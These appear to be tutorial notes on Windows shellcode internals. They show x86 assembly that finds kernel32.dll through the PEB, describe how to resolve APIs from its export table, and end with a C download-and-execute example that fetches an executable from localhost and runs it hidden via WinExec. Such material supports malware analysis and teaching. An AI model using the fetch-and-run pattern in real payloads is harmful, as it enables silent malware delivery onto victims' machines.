Windows shellcodes follow these steps to achieve their target:
1. Get the absolute address (we covered this in the previous section).
2. Get the kernel32.dll's ImageBase.
3. Get the required APIs from kernel32.dll.
4. Execute the payload.

To access any API inside any DLL, the shellcode must get the address of the kernel32.dll and parse its export table.

When an application is being loaded into memory, the Windows OS loads its core libraries, such as kernel32.dll and ntdll.dll, and saves the addresses and other information of these libraries inside the Process Environment Block (PEB).

mov eax,dword ptr fs:[30h]
mov eax,dword ptr [eax+0Ch]
mov ebx,dword ptr [eax+1Ch]
mov ebx,dword ptr [ebx]
mov esi,dword ptr [ebx+8h]

Getting the required APIs from Kernel32.dll

to access the kernel32.dll's APIs, it should parse its export
table. The export table consists of three arrays

AddressOfNames - names of APIs
AddressOfFunctions - relative addresses of APIs

Two arrays have different alignments

To handle this issue, Windows created a third array named AddressOfNameOrdinals.
This array has the same alignment as AddressOfNames and contains the index of every
item in the AddressOfFunctions

To get required APIs
search for the required API's name in AddressOfNames and then take the index of it
search for that index in
AddressOfNameOrdinals to find the equivalent index of this API in
AddressOfFunctions

**The download and execute shellcode**
This shellcode uses an API in urlmon.dll called URLDownloadToFileA.

URLDownloadToFile
( LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, _Reserved_ DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB );

Only szURL and szFilename are required. The remaining arguments are mostly set to NULL. After the file is downloaded, the shellcode executes this file using CreateProcessA,
WinExec, or ShellExecute. 

The C code of it may look like this:
URLDownloadToFileA(0,"https://localhost:4444/calc.exe","calc.exe",0,0);
WinExec("calc.exe",SW_HIDE);




